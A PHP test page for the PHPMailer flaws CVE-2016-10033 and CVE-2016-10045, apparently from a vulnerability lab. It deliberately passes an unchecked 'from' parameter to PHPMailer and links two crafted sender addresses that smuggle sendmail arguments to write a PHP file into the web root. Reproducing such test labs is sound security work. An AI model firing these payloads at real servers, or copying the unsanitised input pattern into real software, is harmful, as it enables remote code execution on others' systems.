<?php
require('vendor/phpmailer/phpmailer/PHPMailerAutoload.php');

function send($from) {
    $mail = new PHPMailer;

    $mail->setFrom($from);
    $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient

    $mail->isHTML(true);                                  // Set email format to HTML

    $mail->Subject = '<?php phpinfo(); ?>';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    if(!$mail->send()) {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo 'Message has been sent' . "\n";
    }

    unset($mail);
}

if (isset ($_GET['from'])) {
	send($_GET['from']);
}

?>

<html>
	<head>
		<meta charset="utf-8"/>
		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
		<title>PHPMailer 漏洞测试</title>
	</head>
	<body>
		<a href="/?from=aaa(+-OQueueDirectory=/tmp+-X/var/www/html/10033.php+)@qq.com">CVE-2016-10033 测试</a>
		<br>
		<a href="/?from=a%27(%20-OQueueDirectory=/tmp%20-X/var/www/html/10045.php%20)@a.com">CVE-2016-10045 测试</a>
	</body>
</html>
